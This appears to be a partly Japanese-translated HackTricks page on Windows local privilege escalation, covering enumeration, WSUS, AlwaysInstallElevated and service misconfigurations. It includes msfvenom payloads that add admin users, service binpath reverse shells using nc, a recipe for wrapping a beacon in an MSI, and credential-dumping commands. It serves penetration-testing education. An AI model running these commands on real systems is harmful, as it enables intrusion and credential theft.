# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すための最適ツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初期の Windows 理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、続行する前に次のページを読んでください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs に関する詳細は、次のページを確認してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が何か分からない場合は、続行する前に次のページを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows セキュリティ コントロール

Windows には、システムの列挙を妨げたり、実行ファイルの実行を阻止したり、あなたの活動を検知したりするさまざまな機能があります。privilege escalation enumeration を開始する前に、次のページを読み、これらすべての防御メカニズムを列挙してください：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには 4,700 件を超えるセキュリティ脆弱性が登録されており、Windows 環境が持つ **膨大な攻撃対象** を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploits の Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

env variables に credential/Juicy 情報が保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell のトランスクリプトファイル

この機能を有効にする方法は、[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) を参照してください。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell のパイプライン実行の詳細が記録されます。実行されたコマンド、コマンド呼び出し、スクリプトの一部などが含まれます。ただし、実行の完全な詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの指示に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell のログの最新15件のイベントを表示するには、次のコマンドを実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全な活動および内容の記録が取得され、各コードブロックが実行される際に文書化されることが保証されます。このプロセスは各活動の包括的な監査証跡を保持し、フォレンジックや悪意ある挙動の解析に有用です。実行時にすべての活動を記録することで、プロセスに関する詳細な洞察が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは Windows Event Viewer のパス: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational** にあります。\
最後の20件のイベントを表示するには、次のコマンドを使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

アップデートがhttp**S**ではなくhttpで要求されている場合、システムを侵害できます。

まず、ネットワークがnon-SSLのWSUSアップデートを使用しているかどうかを確認するために、cmdで以下を実行します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または PowerShell で次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信があった場合：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.  
もし `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` の場合。

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.  
その場合、**it is exploitable.** 最後のレジストリ値が `0` の場合、WSUS のエントリは無視されます。

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.  
この脆弱性を悪用するには、次のようなツールを使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — これらは非SSL WSUS トラフィックに対して 'fake' アップデートを注入する、MiTM 用に weaponized された exploit スクリプトです。

Read the research here:  
調査は以下を参照してください：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:  
要するに、これはこのバグが悪用する欠陥です:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.  
> ローカルユーザープロキシを変更する権限があり、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用している場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自分自身のトラフィックを傍受し、アセット上で elevated user としてコードを実行することが可能になります。
> 
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.  
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、そのユーザーの証明書ストアも使用します。WSUS ホスト名用の自己署名証明書を生成してそれを現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS トラフィックを傍受できます。WSUS は証明書に対して trust-on-first-use 型の検証を実装する HSTS のような仕組みを持っていません。提示された証明書がユーザーにより信頼され、ホスト名が一致すれば、サービスはそれを受け入れます。

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).  
この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使って悪用できます（公開後）。

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.  
特定の条件下の Windows **domain** 環境において、**local privilege escalation** の脆弱性が存在します。これらの条件は、**LDAP signing が強制されていない** 環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる自己権限を持っていること、そしてドメイン内にコンピュータを作成できる能力を含みます。これらの**要件**は**デフォルト設定**で満たされる点に注意してください。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)  
Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)  
攻撃のフローについての詳細は次を参照してください: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.  
**もし** これら2つのレジストリが **有効 (enabled)** （値が **0x1**）になっていると、あらゆる権限のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreterセッションがある場合、この手法はモジュール **`exploit/windows/local/always_install_elevated`** を使用して自動化できます

### PowerUP

カレントディレクトリ内に権限昇格用のWindows MSIバイナリを作成するために、power-upの `Write-UserAddMSI` コマンドを使用します。 このスクリプトは、ユーザー/グループの追加を要求するプリコンパイル済みMSIインストーラを書き出します（そのためGIU accessが必要です）:
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このチュートリアルを読んで、これらのツールを使ってMSI Wrapperを作成する方法を学んでください。コマンドラインを**単に****実行**したい場合は、**.bat** ファイルをラップできることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit を使用して、`C:\privesc\beacon.exe` に新しい **Windows EXE TCP payload** を生成します。
- Visual Studio を開き、Create a new project を選択して検索ボックスに "installer" と入力します。Setup Wizard プロジェクトを選択し、Next をクリックします。
- プロジェクト名を例えば **AlwaysPrivesc** にし、ロケーションに **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- **Next** をクリックし続け、4段階中のステップ3 (choose files to include) まで進みます。**Add** をクリックして先ほど生成した Beacon ペイロードを選択し、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- Author や Manufacturer のように変更できる他のプロパティもあり、インストールされたアプリをより正規のように見せることができます。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** を選択して **OK** をクリックします。これにより、インストーラが実行されるとすぐに Beacon ペイロードが実行されるようになります。
- **Custom Action Properties** の下で **Run64Bit** を **True** に変更します。
- 最後に、**build it**（ビルド）します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルの**インストール**を**バックグラウンド**で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出

### 監査設定

これらの設定は何が**ログに記録されるか**を決めるため、注意が必要です。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されているかを知っておくと興味深い。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、ドメインに参加しているコンピューター上のローカル Administrator パスワードの管理を目的として設計されており、各パスワードが **一意で、ランダム化され、定期的に更新される** ことを保証します。これらのパスワードは Active Directory に安全に格納され、ACLs を通じて十分な権限が付与されたユーザーのみがアクセスでき、許可された場合にローカル admin パスワードを表示できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文のパスワードが LSASS に保存されます** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスによるそのメモリの読み取りやコードの注入を試みる動作を **ブロック** してシステムをさらに保護するようにしました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。これは、デバイスに保存された資格情報を pass-the-hash 攻撃のような脅威から保護することを目的としています。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** は **Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントで利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常そのユーザーの domain credentials が確立されます.\

[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザー & グループ

### ユーザー & グループの列挙

自分が所属するグループに興味深い権限がないか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが**何らかの特権グループに属しているなら、権限を昇格できる可能性があります**。ここで特権グループとそれを悪用して権限を昇格させる方法を学んでください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token の操作

**詳しくは** このページで **token** が何かを学んでください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
次のページをチェックして、**興味深い tokens について学び**、それらを悪用する方法を確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルおよびフォルダの権限

まず最初に、プロセスを列挙して、**プロセスのコマンドライン内にパスワードが含まれていないかを確認する**。\
実行中のバイナリを**上書きできるか**、あるいはバイナリフォルダに書き込み権限があるかを確認し、可能であれば [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用する:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に[**electron/cef/chromium debuggers**が実行されていないか確認してください。悪用して権限を昇格させる可能性があります](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが置かれているフォルダの権限を確認する（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals の **procdump** を使って、実行中のプロセスのメモリダンプを作成できます。FTP のようなサービスは **credentials in clear text in memory** を持っていることがあるので、メモリをダンプしてそれらを読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 脆弱な GUI アプリ

**SYSTEM として動作するアプリケーションは、ユーザーに CMD を起動させたり、ディレクトリを閲覧させたりする可能性があります。**

例: "Windows Help and Support" (Windows + F1)、"command prompt" を検索し、"Click to open Command Prompt" をクリック

## サービス

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには **sc** を使用できます
```bash
sc qc <service_name>
```
各サービスの必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" が任意のサービスを変更できるかどうかを確認することをおすすめします:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生している場合（例えば SSDPSRV）:

_システム エラー 1058 が発生しました._\
_サービスは開始できません。無効になっているか、関連付けられた有効なデバイスが存在しないためです._

次のコマンドで有効にできます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost が動作するためには SSDPSRV に依存していることに注意してください（XP SP1 向け）**

**この問題の別の回避策** は次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

サービス上で "Authenticated users" グループが **SERVICE_ALL_ACCESS** を所持している場合、そのサービスの実行可能バイナリを変更することが可能です。変更および実行のために **sc** を使用するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限昇格は以下のようなさまざまな権限を通じて可能です：

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリを再構成できます。
- **WRITE_DAC**: 権限の再設定を可能にし、結果としてサービス設定を変更できるようになります。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を許可します。
- **GENERIC_WRITE**: サービス設定を変更する能力を含みます。
- **GENERIC_ALL**: 同様にサービス設定を変更する能力を含みます。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの弱い権限

**サービスによって実行されるバイナリを変更できるかどうかを確認する**、またはバイナリが配置されているフォルダに**書き込み権限があるか**を確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
サービスによって実行されるすべてのバイナリは **wmic** を使って取得できます（system32内のものは除く）、権限は **icacls** で確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** を使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

任意のサービスレジストリを変更できるか確認してください。\\
次のようにしてサービス**レジストリ**に対する**権限**を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているかどうかを確認する必要があります。もしそうであれば、サービスによって実行されるバイナリを変更できます。

実行されるバイナリの Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services レジストリの AppendData/AddSubdirectory 権限

レジストリに対してこの権限がある場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows サービスの場合、これは**任意のコードを実行するのに十分です:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 引用符で囲まれていない Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースより前の各候補を順に実行しようとします。

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないすべてのサービスパスを列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**検出および悪用できます** この脆弱性は metasploit の `exploit/windows/local/trusted\_service\_path` で検出・悪用できます。metasploit を使って手動で service binary を作成することもできます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 復旧アクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能はバイナリを指すように設定できます。もしそのバイナリを置き換え可能であれば、権限昇格が可能になる場合があります。詳細は[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

バイナリの**権限**を確認してください（上書きして権限昇格できる可能性があります）、および**フォルダ**の権限も確認してください（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特定のファイルを読み取るためにconfig fileを変更できるか、またはAdministrator account (schedtasks)によって実行されるbinaryを変更できるかを確認してください。

システム内の弱いフォルダ/ファイルの権限を見つける方法の一つは次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 起動時に実行

**別のユーザーによって実行される registry または binary を上書きできるか確認してください。**\  
**読む** ために **以下のページ** を確認し、興味深い **autoruns locations to escalate privileges** について詳しく学んでください：

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

可能性のある **third party weird/vulnerable** drivers を探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

もし **write permissions inside a folder present on PATH** がある場合、プロセスが読み込む DLL をハイジャックして **escalate privileges** できる可能性があります。

PATH 内のすべてのフォルダの権限を確認:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細は次を参照してください：

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
